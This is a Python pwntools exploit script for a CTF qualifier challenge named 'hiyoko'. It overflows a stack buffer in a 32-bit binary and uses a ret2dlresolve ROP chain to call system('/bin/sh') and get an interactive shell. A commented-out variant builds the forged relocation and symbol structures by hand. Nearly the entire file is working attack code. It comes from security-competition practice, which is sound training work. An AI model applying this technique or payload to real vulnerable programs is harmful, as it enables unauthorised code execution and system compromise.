#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host hiyoko.quals.seccon.jp --port 9001 chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.arch = 'i386'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'hiyoko.quals.seccon.jp'
port = int(args.PORT or 9001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *0x80491af
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

junk = b'A'*136

bss = 0x804c01c
leave_ret = 0x080490e5
resolver = 0x8049030
ret = 0x0804900e

SYMTAB = 0x804820c
STRTAB = 0x804825c
JMPREL = 0x80482d8

#stage1 = (
#    b'A'*132 +
#    p32(bss) +
#    p32(exe.got['gets']) +
#    p32(leave_ret) + 
#    p32(bss)
#)
#
#forged_area = bss + 0x14
#rel_offset = forged_area - JMPREL
#elf32_sym = forged_area + 0x8
#
#align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)
#elf32_sym += align
#index_sym = (elf32_sym - SYMTAB) // 0x10
#
#r_info = (index_sym << 8) | 0x7
#
#elf32_rel = p32(exe.got["gets"]) + p32(r_info)
#st_name = (elf32_sym + 0x10) - STRTAB
#elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)
#
#stage2 = b""
#stage2 += b'B'*4 
#stage2 += p32(resolver) 
#stage2 += p32(rel_offset) 
#stage2 += b'C'*4 
#stage2 += elf32_sym_struct 
#stage2 += b'system\x00'
##pad = (100 - len(stage2))
##stage2 += b'D'*pad
#stage2 += b'sh\x00'
##pad = (0x200 - len(stage2))
##stage2 += b'E'*pad
#
#io.sendline(stage1 + stage2)

r = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
r.gets(dlresolve.data_addr)
r.raw(p32(ret))
r.ret2dlresolve(dlresolve)
raw_rop = r.chain()

io.sendline(junk + raw_rop)

io.interactive()

